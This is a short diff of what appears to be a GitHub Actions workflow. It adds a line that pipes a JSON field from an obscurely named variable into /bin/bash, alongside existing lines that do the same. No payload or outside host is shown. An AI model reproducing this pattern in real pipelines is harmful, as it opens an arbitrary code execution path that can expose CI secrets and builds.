@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$vko768" | jq -r .jmv6442 | /bin/bash
           printf '%s' "$lkasf98614" | jq -r .gz2 | /bin/bash
           echo $icgm47873 | jq -r .tzfh20265 | /bin/bash
+          echo $r7 | jq -r .jooq1 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
